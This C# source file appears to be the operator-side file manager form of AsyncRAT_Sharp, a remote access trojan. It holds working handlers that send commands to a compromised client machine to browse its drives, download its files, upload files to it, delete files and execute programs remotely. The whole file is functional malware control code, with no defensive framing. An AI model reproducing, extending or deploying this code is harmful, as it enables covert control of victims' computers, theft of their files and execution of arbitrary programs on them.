using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FileManager : Form
    {
        public FileManager()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count == 1)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getPath";
                    msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                    toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
                }
            }
            catch
            {

            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                string path = toolStripStatusLabel1.Text;
                if (path.Length == 2)
                {
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                    return;
                }
                path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = path + "\\";
                toolStripStatusLabel1.Text = path;
                C.BeginSend(msgpack.Encode2Bytes());
            }
            catch
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getDrivers";
                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                return;
            }

        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        msgpack.ForcePathObject("DWID").AsString = dwid;
                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
                            if (SD == null)
                            {
                                SD = new DownloadFile
                                {
                                    Name = "socketDownload:" + dwid,
                                    Text = "socketDownload:" + C.ID,
                                    F = F
                                };
                                SD.Show();
                            }
                        }));
                    }
                }
            }
            catch
            {

            }
        }

        private async void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog O = new OpenFileDialog();
                if (O.ShowDialog() == DialogResult.OK)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "uploadFile";
                    await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                    msgpack.ForcePathObject("Name").AsString = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(O.FileName);
                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "deleteFile";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                    }
                }
            }
            catch { }
        }

        private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                msgpack.ForcePathObject("Command").AsString = "getPath";
                msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
            }
            catch
            {

            }
        }

        private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        MsgPack msgpack = new MsgPack();
                        string dwid = Guid.NewGuid().ToString();
                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
                        msgpack.ForcePathObject("Command").AsString = "execute";
                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                    }
                }
            }
            catch
            {

            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (!C.ClientSocket.Connected) this.Close();
        }
    }
}